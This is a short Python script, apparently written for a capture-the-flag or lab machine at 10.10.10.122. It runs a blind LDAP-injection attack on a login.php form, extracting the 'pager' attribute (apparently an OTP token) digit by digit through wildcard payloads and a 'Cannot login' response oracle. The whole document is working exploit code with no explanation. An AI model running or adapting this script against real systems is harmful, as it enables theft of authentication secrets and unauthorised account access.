#!/usr/bin/python3
import requests
from time import sleep
from string import digits, ascii_lowercase
import sys

#print(digits)
#print(ascii_lowercase)

url='http://10.10.10.122/login.php'
token = ""
attribute = "pager"
loop=1

while loop > 0 :
    for digit in digits:
        token=token
        query= f'ldapuser%29%28{attribute}%3d{token}{digit}%2a'

        data= {'inputUsername': query, 'inputOTP': "1234"}
        r= requests.post(url, data=data)
        ### Overwrites what it is printing so as to give live results
        sys.stdout.write(f'\rToken: {token}{digit}')
        sleep(1)
        if 'Cannot login' in r.text:
         #   print(f'Success: {digit}')
           # print(f'Success: {digit}')
            token= token + digit
            break
        elif digit == "9":
            loop=0
            break

